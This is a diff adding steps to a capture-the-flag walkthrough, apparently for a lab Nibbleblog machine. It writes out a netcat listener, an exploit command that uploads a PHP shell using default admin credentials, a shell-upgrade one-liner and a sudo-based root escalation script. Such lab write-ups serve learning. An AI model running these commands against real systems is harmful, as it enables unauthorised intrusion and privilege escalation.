@@ -233,14 +233,26 @@ by Ben "epi" Risher 🤓                 ver: 2.10.1
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/25f418ba-986a-44b0-9708-61663df3c527)
 
 + Start netcat listener: `nc -lnvp 5555`
++ Run exploit:
+```
+python3 exploit.py --url http://10.10.10.75/nibbleblog/ --username admin --password nibbles --payload shell.php
+```
 
++ More stable shell: `python3 -c 'import pty; pty.spawn("/bin/bash")'`
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/74939561-8d9a-4e2a-9f24-8b5661abd10a)
 
+## Privilege Escalation:
++ `sudo -ll`
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/0dcbc002-98b1-46f4-8363-778c5a22622b)
 
+```
+#!/bin/sh
+bash
+```
 
-
-
-
-
++ Get root.
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/905a5a63-bb34-4ce0-805e-bd44d6d8ccfc)
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/2b882521-2b36-4314-9a10-ca2394f638ac)
 
 
 
